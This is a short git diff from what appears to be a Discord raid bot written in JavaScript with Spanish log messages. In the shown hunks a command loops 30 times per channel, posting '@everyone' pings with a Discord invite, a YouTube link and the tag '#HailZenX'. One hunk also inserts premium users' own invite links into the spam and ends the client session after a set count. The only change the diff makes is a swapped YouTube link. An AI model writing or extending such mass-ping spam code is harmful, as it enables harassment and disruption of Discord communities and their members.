@@ -173,7 +173,7 @@ client.on(`messageCreate`,async (msg)=>{
             let canalxdxd = client.channels.cache.get(canal.id);
             for (let index = 0; index < 30; index++) {
                 try {
-                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
+                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
                 } catch (e) {
                     console.log(`[X] No se pudo enviar un mensaje con el comando "on", mensaje de error: ${e.message}`);
                 }
@@ -714,7 +714,7 @@ client.on(`messageCreate`,async (msg)=>{
                     let canalxdxd = namev.channels.cache.get(canal.id);
                     for (let index = 0; index < 30; index++) {
                         try {
-                            await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc ${config_usuarios_premium[msg.author.id].invite_url} - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
+                            await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc ${config_usuarios_premium[msg.author.id].invite_url} - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
                             counterrrrr++;
                             if(chsisssss <= counterrrrr){
                                 await namev.destroy();
